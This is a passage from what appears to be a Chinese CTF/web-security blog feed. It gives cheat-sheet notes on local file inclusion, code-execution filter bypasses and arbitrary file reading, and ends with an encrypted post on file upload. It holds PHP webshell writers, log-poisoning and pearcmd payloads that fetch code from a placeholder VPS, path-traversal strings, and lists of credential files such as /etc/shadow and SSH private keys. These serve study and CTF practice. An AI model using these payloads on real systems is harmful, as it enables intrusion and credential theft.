class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs smalltalk">tac&lt;/fla\g.php||<br>awk%<span class="hljs-number">09</span><span class="hljs-string">&#x27;/f/&#123;print&#125;&#x27;</span>%<span class="hljs-number">09</span>/fla?||<br>uniq<span class="hljs-string">$&#123;</span><span class="hljs-type">IFS</span>&#125;/f???<br>/???/????<span class="hljs-number">64</span> /????<br>uniq `expr substr <span class="hljs-string">$P</span>ATH <span class="hljs-number">11</span>`f*<br>od -c <span class="hljs-string">$&#123;</span><span class="hljs-type">OLDPWD</span>&#125;flag<br>cat <span class="hljs-string">$&#123;</span><span class="hljs-type">PATH</span>:<span class="hljs-number">0</span>:<span class="hljs-number">1</span>&#125;f*<br><span class="hljs-string">$&#123;</span><span class="hljs-type">PATH</span>:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#HOME</span>&#125;:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125;<span class="hljs-string">$&#123;</span><span class="hljs-type">PATH</span>:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#LESS</span>&#125;:<span class="hljs-string">$&#123;</span><span class="hljs-type">SHLVL</span>&#125;&#125;   <span class="hljs-symbol">#ls</span><br><span class="hljs-string">$&#123;</span><span class="hljs-type">PATH</span>:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#HOME</span>&#125;:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125;<span class="hljs-string">$&#123;</span><span class="hljs-type">PATH</span>:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#RANDOM</span>&#125;:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125; ?<span class="hljs-string">$&#123;</span><span class="hljs-type">PATH</span>:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#RANDOM</span>&#125;:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125;??   #应该是这个：nl flag<br><span class="hljs-string">$&#123;</span><span class="hljs-type">PWD</span>::<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125;???<span class="hljs-string">$&#123;</span><span class="hljs-type">PWD</span>::<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125;?<span class="hljs-string">$&#123;</span><span class="hljs-type">USER</span>:~<span class="hljs-type">A</span>&#125;? ????   #/bin/cat flag<br>&lt;<span class="hljs-type">A</span>;<span class="hljs-string">$&#123;</span><span class="hljs-type">HOME</span>::<span class="hljs-string">$?</span>&#125;???<span class="hljs-string">$&#123;</span><span class="hljs-type">HOME</span>::<span class="hljs-string">$?</span>&#125;?????<span class="hljs-string">$&#123;</span><span class="hljs-type">RANDOM</span>::<span class="hljs-string">$?</span>&#125; ????      #/bin/base64 flag<br></code></pre></td></tr></table></figure><h3 id="无参数无数字字母rce">无参数/无数字字母RCE</h3><p>参考https://xz.aliyun.com/t/8107#toc-0、https://xz.aliyun.com/t/9360</p><p>过滤system<code>popen()</code>、<code>passthru()</code>、<code>proc_open()</code>、<code>pcntl_exec()</code>、<code>shell_exec()</code></p><h4 id="一些常用函数">(1)一些常用函数</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print_r</span><span class="hljs-params">()</span></span> 打印字符串（可以用连接符）、数组、对象。<br><span class="hljs-function"><span class="hljs-title">scandir</span><span class="hljs-params">()</span></span> 扫描目录下的文件<br><span class="hljs-function"><span class="hljs-title">current</span><span class="hljs-params">()</span></span> 返回数组中的当前单元, 默认取第一个值。<br><span class="hljs-function"><span class="hljs-title">localeconv</span><span class="hljs-params">()</span></span> 返回一包含本地数字及货币格式信息的数组<br><span class="hljs-function"><span class="hljs-title">pos</span><span class="hljs-params">()</span></span> 与current差不多<br>可以执行<span class="hljs-selector-tag">a</span>(<span class="hljs-selector-tag">b</span>(<span class="hljs-built_in">c</span>()))形式时，<span class="hljs-built_in">print_r</span>(<span class="hljs-built_in">scandir</span>(<span class="hljs-built_in">current</span>(<span class="hljs-built_in">localeconv</span>()))) 读当前目录文件<br></code></pre></td></tr></table></figure><h4 id="读取文件函数">(2)读取文件函数</h4><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">file_get_contents</span>() 把整个文件读入一个字符串中<br><span class="hljs-built_in">file</span>() 把整个文件读入一个数组中;<br><span class="hljs-built_in">readfile</span>() 读入一个文件并写入到输出缓冲;<br><span class="hljs-built_in">highlight_file</span>() 对文件进行语法高亮显示;<br><span class="hljs-built_in">show_source</span>() 对文件进行语法高亮显示;<br><span class="hljs-built_in">array_flip</span>() 将读取当前目录的键和值进行反转<br><span class="hljs-built_in">array_rand</span>() 随机输出键<br></code></pre></td></tr></table></figure><h2 id="lfi_to_rce">LFI_to_RCE</h2><p>example：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="图片马getshell">图片马getshell</h3><p>条件： <code>allow_url_include=on</code><code>allow_url_fopen=on</code></p><p>图片马内容，会在当前目录下生成shell.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;shell.php&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>),<span class="hljs-string">&#x27;&lt;? @eval($_POST[1]);?&gt;&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3id="临时文件phpinfo条件竞争getshell">临时文件+phpinfo条件竞争getshell、</h3><p>基本没遇到过，写个思路以及别人的方法，遇到了再深入</p><p><ahref="https://blog.csdn.net/qq_43576303/article/details/119105376">思路</a>：实质上是连续传输很大的字节到服务器导致删除文件有时间差，包含临时的/tmp/6字节长度文件名php</p><p><ahref="https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md">脚本</a>：python2的脚本</p><h3 id="日志getshell">日志getshell</h3><h4 id="apache日志文件">apache日志文件</h4><p>条件： apache日志文件路径已知，或配置文件路径已知，有可读权限</p><p>先看<code>/etc/init.d/httpd</code>或<code>/etc/httpd/conf/httpd.conf</code>找到log文件路径</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">/<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;/var/www/html/shell.php&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>),<span class="hljs-string">&#x27;&lt;? @eval($_POST[1]);?&gt;&#x27;</span>);<span class="hljs-meta">?&gt;</span><br><br>payload：<br>?file=/usr/local/apache/logs/error_log<br>?file=/usr/local/apache/logs/access_log<br><br>?file=shell.php<br></code></pre></td></tr></table></figure><h4 id="ssh日志文件">ssh日志文件</h4><p>条件 SSH日志路径已知，有可读权限</p><p>将ssh用户名写为php马，ssh自动写入<code>/var/log/auth.log</code></p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">ssh &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;@192.168.136.143</span><br><span class="language-xml"></span><br><span class="language-xml">payload：</span><br><span class="language-xml">?file=/var/log/auth.log</span><br></code></pre></td></tr></table></figure><h3 id="session文件包含getshell">Session文件包含getshell</h3><p>条件： <code>php&gt;=5.4</code><code>session.upload_progress.enable = on</code>已知<code>session.save_path</code></p><p>分为两种</p><ol type="1"><li>session.upload_progress.cleanup = on</li></ol><p>文件会清空，需要条件竞争</p><ol type="1"><li>session.upload_progress.cleanup = off</li></ol><p>文件不会清空，直接包含<code>session.save_path+session.upload_progress.prefix+session_id</code>文件</p><h3 id="pearcmd.php文件包含getshell">pearcmd.php文件包含getshell</h3><p>条件 安装了pear扩展已知<code>pearcmd.php</code>路径(默认路径是<code>/usr/local/lib/php/pearcmd.php</code>)<code>register_argc_argv=on</code>（只有开启了，<code>$_SERVER['argv']</code>才会生效。）</p><p>三种方法</p><p>config-create</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);?&gt;+/tmp/test.php<br></code></pre></td></tr></table></figure><p>install</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">?<span class="hljs-code">+install+</span>--installroot<span class="hljs-code">+&amp;file=/usr/local/lib/php/pearcmd.php&amp;+</span><span class="hljs-link">http://</span>[<span class="hljs-string">vps</span>]:[port]/test.php<br></code></pre></td></tr></table></figure><p>download</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">?<span class="hljs-code">+download+</span><span class="hljs-link">http://</span>[<span class="hljs-string">vps</span>]:[port]/test1.php&amp;file=/usr/local/lib/php/pearcmd.php<br></code></pre></td></tr></table></figure><p>具体参考：<ahref="https://xilitter.github.io/2023/01/31/利用pearcmd-php文件包含拿shell（LFI）/index.html">pearcmd文件包含getshell</a></p><h2 id="文件读取利用">文件读取利用</h2><h3 id="常见读取的敏感文件路径">常见读取的敏感文件路径</h3><p>参考https://www.buaq.net/go-161450.html</p><h4 id="windows">windows</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Plain">C:\boot.ini //查看系统版本<br>C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件<br>C:\Windows\repair\sam //存储系统初次安装的密码<br>C:\Program Files\mysql\my.ini //Mysql配置<br>C:\Program Files\mysql\data\mysql\user.MYD //Mysql root<br>C:\Windows\php.ini //php配置信息<br>C:\Windows\my.ini //Mysql配置信息<br></code></pre></td></tr></table></figure><h4 id="linux">Linux</h4><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-regexp">/root/</span>.ssh<span class="hljs-regexp">/authorized_keys /</span><span class="hljs-operator">/</span>如需登录到远程主机，需要到.ssh目录下，新建authorized_keys文件，并将id_rsa.pub内容复制进去<br><span class="hljs-regexp">/root/</span>.ssh<span class="hljs-regexp">/id_rsa /</span><span class="hljs-operator">/</span>ssh私钥,ssh公钥是id_rsa.pub<br><span class="hljs-regexp">/root/</span>.ssh<span class="hljs-regexp">/id_ras.keystore /</span><span class="hljs-operator">/</span>记录每个访问计算机用户的公钥<br><span class="hljs-regexp">/root/</span>.ssh<span class="hljs-regexp">/known_hosts  /</span><span class="hljs-regexp">/ssh会把每个访问过计算机的公钥(public key)都记录在~/</span>.ssh<span class="hljs-operator">/</span>known_hosts<span class="hljs-operator">。</span>当下次访问相同计算机时，<span class="hljs-type">OpenSSH会核对公钥</span><span class="hljs-operator">。</span>如果公钥不同，<span class="hljs-type">OpenSSH会发出警告，</span> 避免你受到<span class="hljs-type">DNS</span> <span class="hljs-type">Hijack之类的攻击</span><span class="hljs-operator">。</span><br><span class="hljs-regexp">/etc/</span>passwd <span class="hljs-comment">// 账户信息</span><br><span class="hljs-regexp">/etc/</span>shadow <span class="hljs-comment">// 账户密码文件</span><br><span class="hljs-regexp">/etc/</span>my.cnf <span class="hljs-comment">//mysql 配置文件</span><br><span class="hljs-regexp">/etc/</span>httpd<span class="hljs-regexp">/conf/</span>httpd.conf <span class="hljs-comment">// Apache配置文件</span><br><span class="hljs-regexp">/etc/</span>redhat<span class="hljs-operator">-</span>release 系统版本 <br><span class="hljs-regexp">/root/</span>.bash_history <span class="hljs-comment">//用户历史命令记录文件</span><br><span class="hljs-regexp">/root/</span>.mysql_history <span class="hljs-comment">//mysql历史命令记录文件</span><br><span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/mlocate/</span>mlocate.db <span class="hljs-comment">//全文件路径</span><br><span class="hljs-regexp">/proc/</span><span class="hljs-keyword">self</span><span class="hljs-regexp">/fd/</span>fd[<span class="hljs-number">0</span><span class="hljs-operator">-</span><span class="hljs-number">9</span>]<span class="hljs-operator">*</span>(文件标识符)<br><span class="hljs-regexp">/proc/</span>mounts <span class="hljs-comment">//记录系统挂载设备</span><br><span class="hljs-regexp">/porc/</span>config.gz <span class="hljs-comment">//内核配置文件</span><br><span class="hljs-regexp">/porc/</span><span class="hljs-keyword">self</span><span class="hljs-regexp">/cmdline /</span><span class="hljs-operator">/</span>当前进程的cmdline参数<br><span class="hljs-regexp">/proc/</span>sched_debug 配置文件可以看到当前运行的进程并可以获得对应进程的pid<br><span class="hljs-regexp">/proc/</span>pid<span class="hljs-operator">/</span>cmdline   则可以看到对应pid进程的完整命令行<span class="hljs-operator">。</span><br><span class="hljs-regexp">/proc/</span>net<span class="hljs-operator">/</span>fib_trie   内网<span class="hljs-type">IP</span><br><span class="hljs-regexp">/proc/</span><span class="hljs-keyword">self</span><span class="hljs-operator">/</span>environ   环境变量<br><span class="hljs-regexp">/proc/</span><span class="hljs-keyword">self</span><span class="hljs-operator">/</span>loginuid   当前用户<br></code></pre></td></tr></table></figure><h3 id="绕过思路">绕过思路</h3><p>可以进行fuzz</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs llvm">url编码代替.或者/，如使用<span class="hljs-variable">%2</span>F代替/<br>?filename<span class="hljs-operator">=</span>..<span class="hljs-variable">%2</span>F..<span class="hljs-variable">%2</span>F..<span class="hljs-variable">%2</span>F..<span class="hljs-variable">%2</span>Fetc<span class="hljs-variable">%2</span>Fpasswd<br>二次编码(<span class="hljs-variable">%25</span>)<br>?filename<span class="hljs-operator">=</span>..<span class="hljs-variable">%252</span>F..<span class="hljs-variable">%252</span>F..<span class="hljs-variable">%252</span>F..<span class="hljs-variable">%252</span>Fetc<span class="hljs-variable">%2</span>Fpasswd<br>加入+<br>?filename<span class="hljs-operator">=</span>.+./.+./bin/redacted.dll<br><span class="hljs-variable">%00</span><br>?filename<span class="hljs-operator">=</span>.<span class="hljs-variable">%00</span>./file.php/etc/passwd<span class="hljs-variable">%00</span>.jpg<br>\<br>?filename<span class="hljs-operator">=</span>..<span class="hljs-variable">%5</span><span class="hljs-keyword">c</span>..<span class="hljs-variable">%5</span><span class="hljs-keyword">c</span>/windows/win.iniJava <br><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span> 安全模式绕过<br>?filename<span class="hljs-operator">=</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/etc/passwd<br></code></pre></td></tr></table></figure><h3 id="linux下的常见利用姿势">Linux下的常见利用姿势</h3><h4 id="用户目录下的敏感文件">用户目录下的敏感文件</h4><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">.bash_history</span> <br><span class="hljs-string">.zsh_history</span><br><span class="hljs-string">.psql_history</span><br><span class="hljs-string">.mysql_history</span><br><span class="hljs-string">.profile</span> <br><span class="hljs-string">.bashrc</span><br><span class="hljs-string">.gitconfig</span><br><span class="hljs-string">.viminfo</span><br><br>任意文件读取<span class="hljs-string">/etc/passwd</span><br>提取passwd第一列，即root等一系列用户名<br>读<span class="hljs-keyword">history</span>：<span class="hljs-string">/root/.bash_history</span><br>暴破所有用户的<span class="hljs-string">.bash_history</span>：<span class="hljs-string">/home/</span>§root§<span class="hljs-string">/.bash_history</span><br></code></pre></td></tr></table></figure><p>历史命令重点关注出现的密码、路径、配置文件路径、其他关联IP、日志文件、war包、备份文件路径等等，可进一步读取或利用。PS：如要下载文件，可能会导致过大文件下载失败，可以使用wget进行下载，比如catanlina.out日志文件、war包、备份文件等等。</p><h4 id="全路径">全路径</h4><p>mlocate.db数据库里存储了本地所有文件的配置信息<code>/var/lib/mlocate/mlocate.db</code>利用locate命令将数据输出成文件，这里面包含了全部的文件路径信息<code>locate mlocate.db config</code><code>locate mlocate.db webapps</code><code>locate mlocate.db www</code></p><p>获取到路径后可以进一步挖掘敏感信息和系统漏洞</p><h4 id="程序源代码">程序源代码</h4><p>利用全路径或者其他地方获取到的路径读取一些关键的程序源码。读取WEB-INF/web.xml，进一步读取class文件，反编译得到源码。读取war包，反编译获取源码。</p><h4 id="应用配置文件">应用配置文件</h4><p>获取到网站的相关配置信息，包括站点配置、数据库配置等等，也可进一步获取到源码。</p><ul><li>java站点 <code>/WEB-INF/web.xml</code><code>/WEB-INF/classes/applicationContext.xml</code><code>/WEB-INF/classes/xxx/xxx/xxx.class</code><code>core.jar</code>如果遇到Shiro站点，可以直接利用全路径找到core.jar，去下载core.jar，下载后反编译搜索<code>Base64.decode</code>直接找key，进而getshell。</li><li>tomcat <code>/usr/local/tomcat/conf/tomcat-users.xml</code></li><li>nginx <code>/www/nginx/conf/nginx.conf</code><code>/etc/nginx/nginx.conf</code><code>/usr/local/nginx/conf/nginx.conf</code><code>/usr/local/etc/nginx/nginx.conf</code></li><li>apache <code>/etc/httpd/conf/httpd.conf</code><code>/etc/apache2/apache2.conf</code><code>/etc/apache2/httpd.conf</code></li><li>redis <code>/etc/redis.conf</code></li><li>ssh <code>/etc/ssh/sshd_config</code></li></ul><h4 id="应用日志文件">应用日志文件</h4><p>利用日志文件获取网站后台地址、api接口、备份、等等敏感信息。</p><ul><li>tomcat可以先找到<code>/tomcat/bin/catalina.sh</code>，里边有log的配置路径<code>/webapps/ROOT/logs/catalina.out</code></li><li>apache <code>/var/log/apache2/access.log</code><code>/var/log/apache2/error.log</code><code>/var/log/httpd/access_log</code><code>/etc/httpd/logs/access_log</code><code>/etc/httpd/logs/error_log</code><code>/etc/httpd/logs/error.log</code></li><li>nginx <code>/var/log/nginx/access.log</code><code>/var/log/nginx/error.log</code><code>/usr/local/var/log/nginx/access.log</code><code>/usr/local/nginx/logs</code></li></ul><h3 id="windows下的利用姿势">Windows下的利用姿势</h3><h4 id="盲读取桌面文件">盲读取桌面文件</h4><p>fuzz桌面文件，比如1.txt、2.txt、密码.txt、pass.txt、password.txt等。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>文件包含</tag>
      
      <tag>lfi</tag>
      
      <tag>rce</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件上传</title>
    <link href="/2023/01/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <url>/2023/01/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误。" data-whm="此文章不能被修改。">  <script id="hbeData" type="hbeData" data-hmacdigest="eb116ffb528aa0b6a0a03e2e546e7d602640c055faab6ea4dacac5fc99a4248f">3c7b49972398798ff56b3ee1d5c7cebf0243040549ad41d0a4f857629952e49890bffc5480e8bf32391e06af527f6cbfa3fd058ae34695f92d90e9ac1d18a5f89b3352f7670008e0d859fe4bc322c3419eebbf01848c88763fa44bd88f64e0144298f456c08633f864550b36f5387f9c39e415d2c5d20f14c3a0599482ee8248d11afeffea78c4214c7e04b46461365f56ec6b1bb982bfc9c0c8ba98c2c8ecfc35a5a4da671d14a3d4ec5ac272c1a7106f2b01022440f512efe09c9fdb1b9fbcbb4ecc536b22f516f2489c6a471f8e5cb88b61a95feba23256d992e1ead5215e4f896b5aff256a01be294d8fe95b3de6e44ac9de9022a7750e83e94e7efa3349ede9b8f0c37f516b5381763d0b40d2227dc65fe09f1cba53ffc3b264cede014ffa95e83a7edcdd31ead47ab5ce96f5f4201e445c129bb2e5070f6b3242beee29ab8c667d268ddea3de47afcfef687691001b2aca02fe51f6e66e220c0696433340e748e42fa9654612372e9b34d1d54d015b5ec905d38dfcc316c2f331de65b02f8c1c807f9efd75d6787d19b6fcb22558f4943e9532e6cdfb5a42f0398f663ffdec2ee54805225b98e4f225802e27fdf03fde7cc089f49b7e8891220afecd867f97ac11b5cd0db04957569b1d2c3d50017a8a00c08274b92ea1a9e4a076b20f8baeb852d91ca69d53a33ac2c37385f21f031c66bee8d50fbe7c091725a917262997a714ed898cfe5c0ad6f865beefd4cca95ee630723bcfe38447fcd92d99c2dd93db6a9df8a1ebf0caa48d042907dedc5a883fc0de5cdba084773b2e2dba78b13185dee53a2e17e1305c7ad4c4b210696dbc05fa4961af7f59c66d8b36b4e63a710e5538af2c6e32da903924757a10adff8ab3cb3770c9ea6aeb3825a68f2df69a4d628a2ccd13cc0bfa68e3260273f42428feb3007f651d9817a061195af839f322484a719cad7350cece3caca32d33dcbbd64e9f504bbc37bd10931b31e55ed7da00dfe34c84ccb1298f99540083b2de9574691225ecd485e201fc4d546fd846d893947a526262fae873e204b611570ad924532b0db0b54fac1f34c1fa7e41c11a3bcac30692b7596665b56c7bab140a2b1411e41128fdec74df216d5d7b0f0b2d1bec23439fbdbca10d4237ff96b168ea5c636ef8bca21b65e455174d3ff155fb9e09f2592a46193293a61fcd3e9381c2481a1ca9ba8b6f0c58ddb1aa1aa427df49202331336a59ee0431e1d9cd769d4d7043c00bdf6d5cd5de0ad17640f9945e1118f17bb875c8650dde2012dd7f07b1907130f265455f84711fce0fd9e1f6c49b4eed13bb63ff367b386376a54a3561a0add122715896518a7f269da3e3e1d1263c9c503d70ef59be0d5997c96fc6c4ca933ece79db02e6c2266be5240dad89ac161da392127acf722021dd5d097e475cb4ac544756ceac6a2f02304071e44c4a3d04903d93e23828dd9f9aae25584fb7c82a0193cb0b55064265679d9eaa31122d51275aa84f0cc091cd3c76f36f7d24b10f1cc98aacf4fba9b46c6efe6c44f3085ab65b40ab1f2549b65e00a84e67ade589b61e77601c4eb55ced7b41674ef16e56263388a8ed3dfb62d52324de62eb6eef214f0ee2bbd8ffd6846aca71d58f4caf0238ec82380fe1e7341c0624b5c745d2e15fbaf3556d023d3dd2b42aa62c4df099993c3e3d7f1d6887e3b26ae4587852ad26790730d2b673c2b8b4318dea8e941a2be1e2b87699940286a5095f3ac2c6f85fd87773cf968f8012e60b70e765cd900e66c087c98500a7dc4e0e9b01bf655dd234e303ddc244632493525bd04ccc76d75648fe27be8d53354f5b549c3a1e9e07e0407077bc065086b70dd14543fb00b9aba072d43ad9624a977ea2b0ab1154e62ef3e92c720489932bc6c55aad818f13d68ab7a9d3460f0389e93aa060718f9938995acae799ce8219b88bb3a06d383d7a84223c4069b795c4e43204a0679543b12c5de315971ac6178fa4094b7241ac5ba5805e8eeeb842527c04c8aa44b96ea29ac588c427c50a2d69673fa8dacb73b9965ce61e66121d413be02cb7247486aa00847c11b0ab1405593c6c9c9685060a534e77ae3b7a74c5e1abc1d31e3e5ffde214c5a86306ec24109194ec35b23ef955168bd7f9266bd95d3d37337832c12ddc5f7f4d1cf06ab0db43ce9574e8c031b1e28f6a8ef373bf4f2d7bdc7c093d2ad1065f130a8f079291fc3204d275f9840e47aee292e157798eef0690566daf646e56df355cf1457b16de9e4b9a0f91700c720821a9b2a798abb68fd98d8b203b814a41886fe9d1c9f36beee41435e8a449c1698a25545d351a2b4f9150f35a1264502164ed33b0027e79bb9a320acd3f13372abaeb4081effd74ff0ebe48cec38aeef0706be4ca902c4707f9e13dc74eaff5ae3e69092578d0669777398f7bf8d147771f332f7f1946e9884715dbd2820f0e21e957ccc8f4410642782b5cad3c15c0d86d81381f633f51f4c401df473bbd656eebc2d49ed980e204a5ebead87ed061ec6656d2a875f3bb1ae8ef66edc3c20a6717fbea951f2222f2c792469e9ca014fc75e6938e6e1b5848d81479cb7a785580d9e5dc5f50540caf6e1d5917b00b1d65f24763e221647548d561a44fa1d5d8873d5071057944ed9da5c42e2fea9ab140eb12e772bd5091a4919d539d670aae0a5da5cfc11a7d4aef3e409d9d7dc9baefddd0b8edbe0af57f5e7b43233888746867feea07401376a207ea27146ab2e9036d441d616e169857cb3f4356f4e59db4223276ff5b5362ef9d9ac1e2ec8bbed76740cf40951dab1372ffac7ebe13948da43652e17b16da055d044db6e2900df4ebf4dce11aaab1f4c1452aecb6d66afde10774437ff3c163e5d821a61f4931400ddf572446d1b400edffff3db9335af5ee3aeeb3808eba9f46385f00cafc54e8509b8b075df673641b15cc6a33369c454ad1e0963934eb83c7afacea4fa3b299c3d81f47086c3062f4a8afa605c5054520861a0ece18c23b979361d6453c6750559f4287bb9fd46ddd9c76a210485c6fa5ada11f8f364e729e71b75c1b08c117a1311efa1d038a6fc5c127b6596d59370f46769931b88ac458eb2bf5b5f288439dc0c71d5568defeb50aaf7a25471f3669e0e7cc7aeec73f252870c4a326f945037b3459603faea3a7c7eed3939423fa17c895450f0e4fc5401439c703a05e1651c79b592186c44ac73f8f3933d98a3528b8eec5a11ca2f778fbf6abc6d511627ceeb16519ad2a85b92234c9d17a069a34c56022b6683eddb12bda3d86c6bbaa549d3a272ca177e0ccbdd62d8a696e7b810410ca13ee54f6e39aa5deb360a086c9f66c730b60caeee2c6087f549fe20582ebb08da85b610daf62d2bf63c6f2d1678801fb01bd6fdb28d92c9de57f36c91cf8570c3e96b7420e3469a830b331b7d0edca4f023c6e204ef5c98296c2ea1bc0a953dd6660ecf9fc47f96e8cff4eebc3bb66e2382930855429808ca0e93b28c3cf1115d1f6f81ea1e8e33e609e9d3960a6c89492a9c225c8c992abacdcdb65ae7dcbe05428617d4f9ef5bd2728acde248fe3998221fdf8ea7ae13eba595d8c171061d45b15b1226070b7621c67a91b30ab562795e9c82a016258991a69fd89ac0a81eff272dfa9a88c2c17db1d4f0c77405c7b48d96ec04fb7b05c7e9a0703517909364d0946506716c982c9c71ce2a07787716078109ec6784c2751e46d79792652ccd93993753733dd3a1522cab6fabeccba33dd1130100e8a7e6d8ee9968a76509ee22195bb41278aadcad7c347fc5cb70617e95c9c2f86de24652a32e30486913012822272fd1738acab75ccfc2e68897f33a2014d0f49396388922eefdc4e9b24a7f5ebc6ea40b85d537